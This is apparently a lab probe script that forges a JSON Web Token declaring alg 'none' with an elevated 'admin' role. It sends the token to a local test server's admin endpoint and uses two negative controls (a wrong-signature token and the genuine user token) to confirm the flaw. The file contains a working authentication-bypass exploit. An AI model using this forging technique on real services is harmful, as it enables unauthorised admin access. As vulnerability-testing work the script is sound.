#!/usr/bin/env python3
"""
lab-02 probe: forge an admin token by declaring alg none, then prove the attack is the algorithm and not
something else.

Two controls, because this class has two ways to be wrong:

1. A token with a bad signature but alg HS256 must be rejected. If it is accepted, the endpoint is not
   checking signatures at all and the alg confusion is not the finding.
2. The unmodified token issued by the server must still be refused the admin panel, because it carries
   role user. If it is refused, the authorisation check works and only the signature dispatch is broken.
"""
import base64
import json
import sys
import urllib.error
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8732"


def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def call(path, token=None):
    req = urllib.request.Request(BASE + path)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def main():
    status, body = call("/token")
    good = body["token"]
    h, p, s = good.split(".")
    claims = json.loads(b64d(p))

    # The attack: same claims, elevated role, alg none, signature dropped.
    forged_header = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    forged_payload = b64e(json.dumps({**claims, "role": "admin"}).encode())
    forged = f"{forged_header}.{forged_payload}."

    attack = {}
    attack["status"], attack["body"] = call("/admin", forged)

    # Control 1: valid structure, wrong signature, alg that requires one.
    bad_sig = f"{h}.{forged_payload}.{s}"
    control_sig = {}
    control_sig["status"], control_sig["body"] = call("/admin", bad_sig)

    # Control 2: the genuine token, unmodified, which carries role user.
    control_role = {}
    control_role["status"], control_role["body"] = call("/admin", good)

    attack_ok = attack["status"] == 200 and "flag" in attack["body"]
    sig_ok = control_sig["status"] == 401
    role_ok = control_role["status"] == 403

    result = {
        "lab": "lab-02-jwt-alg",
        "factor": "L03-047",
        "pattern": None,  # W07 is a queued wave, so there is no pattern id to cite yet
        "attack": {"requested_role": "admin", "declared_alg": "none",
                   "status": attack["status"], "reached": "flag" in attack["body"]},
        "negative_control": {
            "wrong_signature_rejected": sig_ok, "wrong_signature_status": control_sig["status"],
            "unmodified_token_not_admin": role_ok, "unmodified_status": control_role["status"],
        },
        "oracle": "admin panel content returned to a token the server never signed",
        "attack_confirmed": attack_ok,
        "control_clean": sig_ok and role_ok,
        "verdict": "OBSERVED" if (attack_ok and sig_ok and role_ok) else "INCONCLUSIVE",
    }
    print(json.dumps(result, indent=1))
    return 0 if result["verdict"] == "OBSERVED" else 1


if __name__ == "__main__":
    sys.exit(main())
